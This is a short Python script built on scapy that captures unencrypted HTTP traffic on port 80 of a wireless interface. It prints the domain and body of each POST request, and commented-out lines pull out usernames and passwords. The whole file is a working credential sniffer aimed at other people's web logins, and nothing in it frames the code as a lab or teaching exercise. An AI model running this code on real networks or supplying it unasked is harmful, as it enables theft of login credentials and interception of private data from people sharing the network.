from scapy.all import *

def sniffer(packet):
    http_packet = packet
    if 'POST' in str(http_packet):
        domain = str(http_packet).split("\\r\\n")[1].split(": ")[1]
        data = str(http_packet).split("\\r\\n\\r\\n")[1]
        #username = data.split("&")[0].split("=")[1]
        #password = data.split("&")[1].split("=")[1].split('"')[0]

        print("**************************************************")
        print("Domain: " + domain)
        print("Data: " + data)
        #print("Username: " + username)
        #print("Password: " + password)
        print("**************************************************")

sniff(iface='wlp2s0', prn=sniffer, filter='tcp port 80')